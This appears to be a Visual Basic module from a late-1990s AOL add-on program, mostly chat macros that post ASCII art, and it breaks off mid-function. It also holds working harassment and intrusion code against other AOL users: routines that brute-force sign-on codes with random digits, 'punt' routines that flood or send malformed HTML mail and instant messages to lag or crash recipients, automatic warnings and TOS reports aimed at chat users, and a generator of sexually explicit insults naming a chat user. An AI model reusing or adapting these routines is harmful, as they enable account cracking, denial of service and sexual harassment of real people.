sendchat ".              |   )___( |                      |  )___(  |"
TimeOut (0.5)
sendchat ".              |    `-`    |                       |    `-`    |"
TimeOut (0.5)
sendchat ".             _[`'-._ _.-'`]_                 _[`'-._ _.-'`]_"
TimeOut (0.5)
sendchat ".           /#`-._B/o\1_.-`#\           /#`-._B/o\2_.-`#\"
TimeOut (0.5)
sendchat ".          /#  .# #`| #`# #. #\        /# . # #|# # # .   #\"
TimeOut (0.5)
sendchat ".         /# #:# # |o# # #:# #\     /# #: # #|o # # :# #\"
TimeOut (0.5)
sendchat ".        /# # |# # | # # #|  # #\   /# # | # #|# # # |  # #\"
TimeOut (0.5)
sendchat ".       (# # #|# # |o# # #|# # #)(# # #| # #|o # # |# # #)"
TimeOut (0.5)
sendchat ".       /`.#/|# # | # # #|\#.    `\  /` .#/| # #|# # # |\#.    `\"
TimeOut (0.5)
sendchat ".       \,_/  |#-#-|-#-#-#|    \_,/  \,_/  |-#-#|#-#-#-|     \_,/"
TimeOut (0.5)
sendchat ".           |~#~#~#~#~#~|           |#~#~#~#~#~#|"
TimeOut (0.5)
sendchat ".             | # # Y # # |                |# # #Y# # #|"
TimeOut (0.5)
sendchat ".              | # #/^\# # |                 |# # /^\ # #|"
TimeOut (0.5)
sendchat ".              | # #| |# # |                 |# # | | # #|"
TimeOut (0.5)
sendchat ".              |_#_#| |#_#_|              |#_#_| |_#_#|"
TimeOut (0.5)
sendchat ".               (.---.) (.---.)                 (.---.) (.---.)"
TimeOut (0.5)
sendchat ".                `---`   `---`                   `---`   `---`"
TimeOut (0.5)

End Sub

Sub Macro_Go0Fy()
sendchat ".                   ."
TimeOut (0.5)
sendchat ".               \   |  /"
TimeOut (0.5)
sendchat ".               _\ | /_"
TimeOut (0.5)
sendchat ".              .' ' ' '.' ' ___   , ."
TimeOut (0.5)
sendchat ".            _.|.--.--.|.___.'___`-."
TimeOut (0.5)
sendchat ".        .'  .' | |  |  | |`----''`   ``'`"
TimeOut (0.5)
sendchat ".      .'  .'   | |()|()| |"
TimeOut (0.5)
sendchat ".._.- -'  .' /           \"
TimeOut (0.5)
sendchat ".`----'`   /      .-.     \"
TimeOut (0.5)
sendchat ".        `(.'.   (___)  .'.)`"
TimeOut (0.5)
sendchat ".            ', ._.--._.,'"
TimeOut (0.5)
sendchat ".              |_|  |_|"
TimeOut (0.5)
sendchat ".                `.`- '.'"
TimeOut (0.5)
sendchat ".                  ``"
TimeOut (0.5)
sendchat ".GØØƒÝ"
TimeOut (2)

End Sub

Sub Macro_Goodbye()
sendchat "      ()__()"
TimeOut (0.5)
sendchat "    (\( oo )"
TimeOut (0.5)
sendchat "     \^'\%'^\"
TimeOut (0.5)
sendchat "      (  .  )\)"
TimeOut (0.5)
sendchat "     Q/--\Q:"
TimeOut (0.5)
BoldSendChat "{S GOODBYE}"
TimeOut (0.5)

End Sub

Sub Macro_HearT()
sendchat ";;;;;;;;;;oOoOOOo                          oOOOoOo"
TimeOut (0.5)
sendchat ";;;;;;ooOOoOOooOo                ;;oOooOOoOOoo"
TimeOut (0.5)
sendchat ";oOOo            OoOOo       ;;oOOoO            oOOo"
TimeOut (0.5)
sendchat "oOOo                 OoOO   ;;OOoO                 oOOo"
TimeOut (0.5)
sendchat "OoO                     OoO  OoO                      OoOO"
TimeOut (0.5)
sendchat ",OOoO                         OO                          OoOO"
TimeOut (0.5)
sendchat ";;OOoO                          o                          OoOO"
TimeOut (0.5)
sendchat ";;;;;OOoO                                                  OoOO"
TimeOut (0.5)
sendchat ";;;;;;;OOoO                                             OoOO"
TimeOut (0.5)
sendchat ";;;;;;;;;;OOoO                                        OoOO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;OOoO                                   OoOO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;OOoO                              OoOO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;OOoO                         OoOO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;;;;OoOOo                 oOOoO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;;;;;;;OOoO              OoOO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;OoOo         oOoO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;OoO       OoO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;OOo   oOO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;OOoOO"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;OoO     "
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;oo   Ou<B>(/\)oP"
TimeOut (0.5)
sendchat ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;o"
TimeOut (0.5)

End Sub

Sub Macro_Rose_MSG()
If MsgBox("You wanna add a message and a person to this Rose?", vbQuestion + vbYesNo, "Iz You Sure?") = vbYes Then
Dim sPrompt As String 'Local variable...
Static iXPos As Integer, iYPos As Integer 'Value maintained between calls...
sPrompt = "Enta Da Name of Da Person to Add To The List Box... "  'Set the prompt...
iXPos = IIf(iXPos > 4000, 0, 0) 'Change windows location...
iXPos = IIf(iYPos > 4000, 0, 0) 'If() Covered next chapter...
sName = InputBox$(sPrompt, IB_TITLE, , iXPos, iYPos)    'Display box, get input
sendchat ".<Font Color=#ff3300>       __   __"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>     /  \./  \/\_ )))<Font Color=#gggggg>  <Font Color=#007700>                  /\"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>    (  _{^\_ _}_   )  }/)<Font Color=#gggggg> <Font Color=#007700>           /    l     <Font Color=#gggggg> {S therose}"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>(   /  /\_/^\._}_/  // )<Font Color=#gggggg> <Font Color=#007700>             \   /  "
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>(__{(@)}\__}.//_/<Font Color=#gggggg> __^____^___\/___^________^____"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>(* \__/{/(_)\_})\\\\<Font Color=#gggggg> ---v-----v-----v--------v-----v-------v----------\"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>( (   (__)_)_/  )\ \))<Font Color=#007700>       / \                 /\"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>   (  \__/  \__/ ))))<Font Color=#gggggg> <Font Color=#007700>      /   \              /    \"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>     \/  \_/    \_/<Font Color=#gggggg>  <Font Color=#007700>        \    /              \    /"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>                                <Font Color=#gggggg><Font Color=#007700> \/                 \/"
TimeOut (0.5)
BoldSendChat (sName)
TimeOut (0.5)
BoldSendChat "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  <3"
TimeOut (0.5)
Else

sendchat ".<Font Color=#ff3300>       __   __"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>     /  \./  \/\_ )))<Font Color=#gggggg>  <Font Color=#007700>                  /\"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>    (  _{^\_ _}_   )  }/)<Font Color=#gggggg> <Font Color=#007700>           /    l     <Font Color=#gggggg> {S therose}"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>(   /  /\_/^\._}_/  // )<Font Color=#gggggg> <Font Color=#007700>             \   /  "
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>(__{(@)}\__}.//_/<Font Color=#gggggg> __^____^___\/___^________^____"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>(* \__/{/(_)\_})\\\\<Font Color=#gggggg> ---v-----v-----v--------v-----v-------v----------\"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>( (   (__)_)_/  )\ \))<Font Color=#007700>       / \                 /\"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>   (  \__/  \__/ ))))<Font Color=#gggggg> <Font Color=#007700>      /   \              /    \"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>     \/  \_/    \_/<Font Color=#gggggg>  <Font Color=#007700>        \    /              \    /"
TimeOut (0.5)
sendchat ".<Font Color=#ff3300>                                <Font Color=#gggggg><Font Color=#007700> \/                 \/"
TimeOut (0.5)
End If


End Sub

Sub Macro_BigRoZe()
sendchat ".       ,                  _......_                  ,"
TimeOut (0.5)
sendchat ".      {'.                .'          '.               .'}"
TimeOut (0.5)
sendchat ".     { ~ '.           _|=       __|_         .'  ~}"
TimeOut (0.5)
sendchat ".    { ~  ~ '-._    (___________) _.-'~  ~  }"
TimeOut (0.5)
sendchat ".   {~  ~  ~   ~.'                      '. ~    ~    }"
TimeOut (0.5)
sendchat ".  {  ~   ~  ~ /       /\         /\      \   ~    ~  }"
TimeOut (0.5)
sendchat ".  {   ~   ~  /        __        __       \ ~   ~    }"
TimeOut (0.5)
sendchat ".   {   ~  /\/      -<( o)       ( o)>-     \/\ ~   ~}"
TimeOut (0.5)
sendchat ".    { ~   ;(           \/    .-.   \/           );   ~ }"
TimeOut (0.5)
sendchat ".     { ~ ~\_    ()   ^    (   )  ^    ()  _/ ~  }"
TimeOut (0.5)
sendchat ".      '-._~ \         (`--._'--'_.--')     / ~_.-'"
TimeOut (0.5)
sendchat ".          '----\         `'._''''''''''_.'`    /--'"
TimeOut (0.5)
sendchat ".                \          \ `---'  /     /"
TimeOut (0.5)
sendchat ".                 ` \         '----'     / '"
TimeOut (0.5)
sendchat ".                     ` \            / '"
TimeOut (0.5)
sendchat ".                         '---....---'"
TimeOut (0.5)
End Sub
Sub Macro_StupidMan()
sendchat ".                  ///// \\\\\\\\\\\\"
TimeOut (0.5)
sendchat ".                 //|~(Ò)^(Ó)~|\\   Yep, I'm a tall"
TimeOut (0.5)
sendchat ".                  d      (..)     b     handsome"
TimeOut (0.5)
sendchat ".                   (  ((((|||))))  )         brain surgeon juzt like my"
TimeOut (0.5)
sendchat ".                    \    \m/   /             AOL Profile sayz!"
TimeOut (0.5)
sendchat ".               ____)        (_____"
TimeOut (0.5)
sendchat ".            /  |  |  ¸   ¸¸    ¸    |  |   \"
TimeOut (0.5)
sendchat ".          /    |  |     ¸¸¸   ¸¸    |  |     \"
TimeOut (0.5)
sendchat ".        /      |    \_______ /   |    ¥ \"
TimeOut (0.5)
sendchat ".      /       /|  #                   |\       \"
TimeOut (0.5)
sendchat ".     /      / /     _____  #  \ \       \"
TimeOut (0.5)
sendchat ".     \      \/     |              |       \/      /"
TimeOut (0.5)
sendchat ".       \    /      | STUPID |        \    /"
TimeOut (0.5)
sendchat ".          \|       |________|        | /  {S WhiteBoy"
TimeOut (0.5)
sendchat ".           |     #                       |"
TimeOut (0.5)
sendchat ".            \ _____________#_/"
TimeOut (0.5)
sendchat ".             /__||___‡‡‡___||__\"
TimeOut (0.5)
sendchat ".            /   |        ¦  ;        |    \"
TimeOut (0.5)
sendchat ".           /   /         ¦  ;         \    \"
TimeOut (0.5)
sendchat ".           |_/           ¦,'            \ _|"
TimeOut (0.5)
sendchat ".           |               /\ «w®£n»  |"
TimeOut (0.5)
End Sub
Function replace(TheStr As String, This As String, WithThis As String)
'by monk-e-god
Dim STRwo13s As String
Dim thepos As String
STRwo13s = TheStr
Do While InStr(1, STRwo13s, This)
DoEvents
thepos = InStr(1, STRwo13s, This)
STRwo13s = Left(STRwo13s, (thepos - 1)) + WithThis + Right(STRwo13s, Len(STRwo13s) - (thepos + Len(This) - 1))
Loop

replace = STRwo13s
End Function


Public Function LineCount(strlngCount As String) As Long
    Dim lngpos As Long, lngcount As Long
    If Len(strlngCount$) < 1 Then
        LineCount& = 0&
        Exit Function
    End If
    lngpos& = InStr(strlngCount$, Chr(13))
    If lngpos& <> 0& Then
        LineCount& = 1
        Do
            lngpos& = InStr(lngpos + 1, strlngCount$, Chr(13))
            If lngpos& <> 0& Then
                LineCount& = LineCount& + 1
            End If
        Loop Until lngpos& = 0&
    End If
    LineCount& = LineCount& + 1
End Function


Public Function LineFromString(strSearch As String, lngline As Long) As String
    Dim strCurLine As String, lngcount As Long
    Dim lngpos As Long, lngPosB As Long, lngDo As Long
    lngcount& = LineCount(strSearch$)
    If lngline& > lngcount& Then
        Exit Function
    End If
    If lngline& = 1 And lngcount& = 1 Then
        LineFromString$ = strSearch$
        Exit Function
    End If
    If lngline& = 1 Then
        strCurLine$ = Left(strSearch$, InStr(strSearch$, Chr(13)) - 1)
        strCurLine$ = replace(strCurLine$, Chr(13), "")
        strCurLine$ = replace(strCurLine$, Chr(10), "")
        LineFromString$ = strCurLine$
        Exit Function
    Else
        lngpos& = InStr(strSearch$, Chr(13))
        For lngDo& = 1 To lngline& - 1
            lngPosB& = lngpos&
            lngpos& = InStr(lngpos& + 1, strSearch$, Chr(13))
        Next lngDo
        If lngpos = 0 Then
            lngpos = Len(strSearch$)
        End If
        strCurLine$ = Mid(strSearch$, lngPosB&, lngpos& - lngPosB& + 1)
        strCurLine$ = replace(strCurLine$, Chr(13), "")
        strCurLine$ = replace(strCurLine$, Chr(10), "")
        LineFromString$ = strCurLine$
    End If
End Function

Sub SID_CRACK(lbl1 As Label, lbl2 As Label, lst As ListBox, txt1 As TextBox)
'ouwop
top:
Call SID_Set_PW(txt1)

TimeOut (0.4)
aomodal% = FindWindow("_AOL_Modal", vbNullString)
edit% = FindChildByClass(aomodal%, "_aol_edit")
okie% = FindChildByClass(aomodal%, "_aol_icon")
If edit% = 0 Then

GoTo top
TimeOut (0.1)
Else
If gettext(okie%) = "Send" Then Call SID_Random(lbl1)
If gettext(okie%) = "Send" Then lst.AddItem lbl1.caption
d$ = lst.listcount
If gettext(okie%) = "Send" Then lbl2.caption = d$ + " Try[z]"
TimeOut (0.5)
If gettext(okie%) = "Send" Then Call SendMessageByString(edit%, WM_SETTEXT, 0, lbl1)
TimeOut (0.5)
'Call ClickIcon(okie%)
If gettext(okie%) = "Send" Then Call cLickiCoN(okie%)
TimeOut (1)
End If

End Sub
Sub SID_CRACK_AOL25(lbl1 As Label, lbl2 As Label, lst As ListBox, txt1 As TextBox)
'ouwop
'If FindAwin("Goodbye from America Online!") Then GoTo ghetto
'If FindAwin("Welcome") Then GoTo ghetto
Call SID_SETPW_AOL25(txt1)
top:
'ghetto:
TimeOut (0.1)
aomodal% = FindWindow("_AOL_Modal", vbNullString)
edit% = FindChildByClass(aomodal%, "_aol_edit")
edit2% = GetWindow(edit%, GW_HWNDNEXT)
edit3% = GetWindow(edit2%, GW_HWNDNEXT)

okie% = FindChildByClass(aomodal%, "_aol_button")

If edit3% = 0 Then
GoTo top
TimeOut (0.1)
Else

Call SID_Random(lbl1)
lst.AddItem lbl1.caption
d$ = lst.listcount
lbl2.caption = d$ + " Try[z]"
TimeOut (0.5)
Call SendMessageByString(edit3%, WM_SETTEXT, 0, lbl1)
TimeOut (0.5)
Call cLickiCoN(okie%)
TimeOut (1)
End If


End Sub

Sub SID_SETPW_AOL25(password As TextBox)
'OOooohhh Ouwop i wunt your body
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
icona% = FindChildByClass(chil%, "_aol_icon") 'sign on
stat% = FindChildByClass(chil%, "_AOL_Static")
stat2% = GetWindow(stat%, GW_HWNDNEXT)
stat3% = GetWindow(stat2%, GW_HWNDNEXT)
stat4% = GetWindow(stat3%, GW_HWNDNEXT)
stat5% = GetWindow(stat4%, GW_HWNDNEXT)
stat6% = GetWindow(stat5%, GW_HWNDNEXT)
stat7% = GetWindow(stat6%, GW_HWNDNEXT) 'pw WELCOME
stat8% = GetWindow(stat7%, GW_HWNDNEXT) 'pw GO0dByE

 iCon2% = GetWindow(icona%, GW_HWNDNEXT)
 iCon3% = GetWindow(iCon2%, GW_HWNDNEXT)
 iCon4% = GetWindow(iCon3%, GW_HWNDNEXT) 'copyright
If FindAwin("Welcome") Then
Call SendMessageByString(stat7%, WM_SETTEXT, 0, PssWorD)
If gettext(icona%) = "Sign On" Then Call SendMessageByNum(stat7%, WM_CHAR, 13, 0)
Else
TimeOut (0.1)
End If
If FindAwin("Goodbye from America Online!") Then
Call SendMessageByString(stat8%, WM_SETTEXT, 0, password)
If gettext(icona%) = "Sign On" Then Call SendMessageByNum(stat8%, WM_CHAR, 13, 0)
Else
TimeOut (0.1)
End If

End Sub

Sub SID_Random(lbl As Label)
'ouwop
Dim a, b, c, d, e, f
Randomize
   a = Int(9 * Rnd + 0)
   b = Int(9 * Rnd + 0)
   c = Int(9 * Rnd + 0)
   d = Int(9 * Rnd + 0)
   e = Int(9 * Rnd + 0)
   f = Int(9 * Rnd + 0)
lbl.caption = a & b & c & d & e & f
End Sub




Sub SID_Set_PW(password As TextBox)
'Ouwop Shoo wahhhh >;c
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
icona% = FindChildByClass(chil%, "_aol_icon")
stat% = FindChildByClass(chil%, "_AOL_Static")
stat2% = GetWindow(stat%, GW_HWNDNEXT)
stat3% = GetWindow(stat2%, GW_HWNDNEXT)
stat4% = GetWindow(stat3%, GW_HWNDNEXT)
 iCon2% = GetWindow(icona%, GW_HWNDNEXT)
 iCon3% = GetWindow(iCon2%, GW_HWNDNEXT)
 iCon4% = GetWindow(iCon3%, GW_HWNDNEXT)
If FindAwin("Sign On") Then
Call SendMessageByString(stat2%, WM_SETTEXT, 0, password)
If gettext(iCon4%) = "SIGN ON" Then Call SendMessageByNum(stat2%, WM_CHAR, 13, 0)
Else
TimeOut (0.1)
End If


If FindAwin("Goodbye from America Online!") Then
Call SendMessageByString(stat4%, WM_SETTEXT, 0, password)
If gettext(iCon4%) = "SIGN ON AGAIN" Then Call SendMessageByNum(stat4%, WM_CHAR, 13, 0)

Else
TimeOut (0.1)
End If

End Sub

Public Sub TextToPictureBox(txtSource As TextBox, picDestination As PictureBox)
'not by me
'unknown progger. >:}

    'this sub will take the text in our textbox and draw it to our
    'picturebox. first you will see that i reset the backcolor of
    'the picturebox. i do this so that our picturebox is "erased"
    'before we draw to it instead of drawing on top of our old text.
    'after using the textout api, notice that i will refresh the
    'picturebox. this is necessary since i have the picturebox's
    'autoredraw property set to true.
    picDestination.BackColor = vbWhite
    If txtSource.Text = "" Then
        picDestination.Refresh
    Else
        Call TextOut(picDestination.hdc, 0&, 0&, txtSource.Text, Len(txtSource.Text))
        picDestination.Refresh
    End If
End Sub


Function Chat_Oubonicz(stText As String, stToReplace As String, stReplaceWith As String) As String
    On Error Resume Next
    For intLoop% = 1 To Len(stText)
    lFindChar& = InStr(1, LCase(stText$), LCase(stToReplace$))
    If lFindChar& = 0 Then
    Chat_Oubonicz$ = stText$
    Exit Function
    End If
    lFindChar& = InStr(1, LCase(stText$), LCase(stToReplace$))
    strCharL$ = Left(stText$, lFindChar& - 1)
    strCharR$ = Right(stText$, Len(stText$) - (lFindChar& + Len(stToReplace$) - 1))
    strCharF$ = strCharL$ + stReplaceWith$ + strCharR$
    stText$ = strCharF$
    Next intLoop%
    Chat_Oubonicz$ = strCharF$
End Function




Function ChatRespond(LookFor As String, Response As String, o1 As Control, o2 As Control, o3 As Control, o4 As Control, o5 As Control, o6 As Control, o7 As Control, tmr As Timer, lbl As Label)
'ouwop
'o1 = say response
'o2 = tos
'o3 = ignore
'o4 = mail punt
'o5 = im
'o6 = insult
'o7 = warn
txt$ = LastChatLine
nAm$ = SNFromLastChatLine
If nAm$ = getuser Then Exit Function Else GoTo ner:
If nAm$ = "OnlineHost" Then Exit Function Else GoTo ner:
ner:
TimeOut (0.0000000000001)
If InStr(LCase(txt$), LCase(LookFor$)) Then
If o1.Value = True Then Call sendchat(ASCII_Random + nAm$ & " - " & Response)
If o2.Value = True Then sn$ = INI_GeT("Uzer", "current", "C:\windows\uzer.ini"): Call Ouwop_TERM(nAm$, sn$, tmr, lbl)
If o3.Value = True Then Call chatignorebyname(nAm$, nAm$)
If o4.Value = True Then Call senDmail(nAm$, ";]", "<HTML><IMG  SRC=""Tiles.exe"" ID=999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"" WIDTH=""1"" HEIGHT=""1"" BORDER=""0"" DATASIZE=""1000""><IMG  SRC=""Niles.exe"" ID=""0 WIDTH=""1"" HEIGHT=""1"" BORDER=""0"" DATASIZE=""1000""><IMG  SRC=")
If o5.Value = True Then Call sendim(nAm$, "<v>azta proggz word responda")
If o6.Value = True Then Call sendchat(SickPhrase(nAm$))
If o7.Value = True Then Call Warn(nAm$)
TimeOut (0.5)
txt$ = "": nAm$ = ""
End If
End Function
Sub BOT_Guezz(Who, What, whatwith, lbl1, txt1, tmr1, lst1)
it$ = lbl1.caption
If What Like ("/guezz *") Then
per$ = Who
GoTo send
End If
Exit Sub
send:
If txt1 = whatwith Then
Exit Sub
End If
Number$ = Mid(What, InStr(What, "/") + 7)
If it$ > Number$ Then
sendchat ("" + per$ + "<B> Guezz higher!")
TimeOut (0.5)
End If
If it$ < Number$ Then
sendchat ("" + per$ + "<B> Guezz lower!")
TimeOut (0.5)
End If
If Number$ = it$ Then
sendchat ("" + per$ + "<B> DaT'z right! Yeah Yeah!")
tmr1.Enabled = False
sendchat Text_VeryCrazy("Game Over!")
TimeOut (0.5)
lst1.AddItem per$
For i = 0 To lst1.listcount - 1
For e = 0 To lst1.listcount - 1

If LCase(lst1.list(i)) Like LCase(lst1.list(e)) And i <> e Then

lst1.RemoveItem (e)
End If

Next e
Next i
End If
txt1.Text = whatwith

End Sub


Sub LagPunt(peeP)
'ouw0p
Call sendim(peeP, "<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html><html></html>I<html></html><html></html><html></html>I")
End Sub



Sub Xaol4_keywerd30(Where$)

run "Keyword"
Do
AOL% = FindWindow("AOL Frame25", vbNullString)
bah = FindChildByTitle(AOL%, "Keyword")
daedit = FindChildByClass(bah, "_AOL_Edit")
TimeOut (0.001)
Loop Until daedit <> 0
daedit = FindChildByClass(bah, "_AOL_Edit")
send daedit, Where$
ico% = FindChildByClass(bah, "_AOL_Icon")
cLickiCoN ico%

End Sub
Sub run(ByVal menuname As String)
Dim mhWnd As Integer
Dim MnuCnt As Integer
Dim Cnt As Integer
Dim SmhWnd As Integer
Dim SMnuCnt As Integer
Dim SCnt As Integer
Dim lint As Integer
Dim lpString As String
AOL% = FindWindow("AOL Frame25", 0&)
mhWnd = GetMenu(AOL%)
MnuCnt = GetMenuItemCount(mhWnd)
For Cnt = 0 To MnuCnt - 1
    SmhWnd = GetSubMenu(mhWnd, Cnt)
    SMnuCnt = GetMenuItemCount(SmhWnd)
    For SCnt = 0 To SMnuCnt - 1
    lint = 30
    lpString = Space(30)
    X = GetMenuString(SmhWnd, SCnt, lpString, lint, MF_BYPOSITION)
    
    If InStr(UCase$(lpString), UCase$(menuname)) Then
        GMnID = GetMenuItemID(SmhWnd, SCnt)
        Ret = SendMessageByNum(AOL%, WM_COMMAND, GMnID, 0)
        DoEvents
        Exit Sub
    End If
    DoEvents
    Next SCnt
Next Cnt

End Sub


Function AOL25_keyword(strkeyword$)
'''''''
'ouwop'
'''''''
If AOL25_FindNO = 1 Then
TimeOut (0.1)
Else
 Dim AOL As Long, MDI As Long, child As Long
    Dim edit As Long, icon As Long
    Call runaolmenubystring("Keyword...")
     AOL& = FindWindow("AOL Frame25", vbNullString)
     MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Let child& = FindWindowEx(MDI&, 0&, "AOL Child", "Keyword")
    Do: DoEvents:  child& = FindWindowEx(MDI&, 0&, "AOL Child", "Keyword"): Loop Until child& <> 0&
    Do: DoEvents:  edit& = FindWindowEx(child&, 0&, "_AOL_Edit", vbNullString): Loop Until edit& <> 0&
    Call SendMessageByString(edit&, WM_SETTEXT, 0&, strkeyword$)
     icon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    Do: DoEvents
         child& = FindWindowEx(MDI&, 0&, "AOL Child", "Keyword")
        Call SendMessageLong(icon&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessageLong(icon&, WM_LBUTTONUP, 0&, 0&)
    Loop Until child& = 0&
End If
End Function
Function AOL25_keyword2(strkeyword$, room$)
'''''''
'ouwop' for ma room buzter
'''''''
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
If AOL25_FindNO = 1 Then
TimeOut (0.3)
Else
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
 Dim AOL As Long, MDI As Long, child As Long
    Dim edit As Long, icon As Long
    Call runaolmenubystring("Keyword...")
    Let AOL& = FindWindow("AOL Frame25", vbNullString)
    Let MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Let child& = FindWindowEx(MDI&, 0&, "AOL Child", "Keyword")
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function

    Do: DoEvents:  child& = FindWindowEx(MDI&, 0&, "AOL Child", "Keyword"): Loop Until child& <> 0&
 If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
  
    Do: DoEvents:  edit& = FindWindowEx(child&, 0&, "_AOL_Edit", vbNullString): Loop Until edit& <> 0&
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
    
    Call SendMessageByString(edit&, WM_SETTEXT, 0&, strkeyword$)
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
    
    Let icon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
    
    Do: DoEvents
        Let child& = FindWindowEx(MDI&, 0&, "AOL Child", "Keyword")
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
        
        Call SendMessageLong(icon&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessageLong(icon&, WM_LBUTTONUP, 0&, 0&)
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
    
    Loop Until child& = 0&
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function

End If
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function

End Function

Sub Chat_Spiral(txtZz)
X = txtZz.Text
thastart:
Dim MYLEN As Integer
MyString = txtZz.Text
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
txtZz.Text = MYSTR
TimeOut 0.5
If txtZz.Text = X Then
Exit Sub
End If
GoTo thastart
End Sub


Private Sub CreateSystrayicon()
Dim picture As Long
Dim message As Long
Dim Tic As NOTIFYICONDATA
Tic.cbSize = Len(Tic)
Tic.hwnd = picture1.hwnd
Tic.uId = 1&
Tic.uFlags = NIF_DOALL
Tic.ucallbackMessage = WM_MOUSEMOVE
Tic.hIcon = picture1.picture
Tic.szTip = "CHANGE ME" & Chr$(0)
erg = Shell_NotifyIcon(NIM_ADD, Tic)
End Sub
Private Sub PictureMouseMove()
X = X / Screen.TwipsPerPixelX
Select Case X
Case WM_RBUTTONDOWN
caption = "right"
Case WM_MOUSEMOVE
caption = "mouse"
End Select
End Sub
Private Sub DeleteSystrayicon(picture)
Dim Tic As NOTIFYICONDATA
Tic.cbSize = Len(Tic)
Tic.hwnd = picture1.hwnd
Tic.uId = 1&
erg = Shell_NotifyIcon(NIM_DELETE, Tic)
End Sub





Sub AdV_IMz(txt As TextBox)
'ouwop
  Dim IM As Long, Rich As Long, icon As Long
    IM& = IMFind&
    If IM& = 0& Then Exit Sub

If SNfromIM = txt Then GoTo hell
txt.Text = SNfromIM
If txt.Text = "" Then GoTo hell Else sendchat (txt + " , iz iming me: BRB")
TimeOut (0.4)
hell:
End Sub

Sub randomSIZE(lbl As Label)
    Dim Dice1
    Randomize
    Dice1 = Int(6 * Rnd + 1)
   If Dice1 = 1 Then lbl.caption = "50"
   If Dice1 = 2 Then lbl.caption = "100"
   If Dice1 = 3 Then lbl.caption = "25"
   If Dice1 = 4 Then lbl.caption = "75"
   If Dice1 = 5 Then lbl.caption = "45"
   If Dice1 = 6 Then lbl.caption = "20"



End Sub

Function SickPhrase(Person) As String
'fity percent uv deez phrazez iz minez
'ouwop
Person = UCase(Person)
Randomize Timer
Select Case Int(Rnd * 30)
    Case 0: Phrase$ = Person + " LIKEZ TO "
    Case 1: Phrase$ = Person + " LUVZ TO "
    Case 2: Phrase$ = "IT MAKEZ " + Person + " HORNY WHEN HE/SHE "
    Case 3: Phrase$ = Person + " AZZHOLE GETZ WET WHEN HE/SHE "
    Case 4: Phrase$ = "IT GIVEZ " + Person + " ANAL PLEAZURE TO "
    Case 5: Phrase$ = "IT MAKEZ " + Person + " CUM WHEN HE/SHE "
    Case 6: Phrase$ = Person + " MOANZ WHEN HE/SHE "
    Case 7: Phrase$ = Person + " CUMZ INTO HIZ ASSHOLE WHEN HE/SHE "
    Case 8: Phrase$ = Person + " LUVZ DA FEELING HE GITZ WHEN HE/SHE "
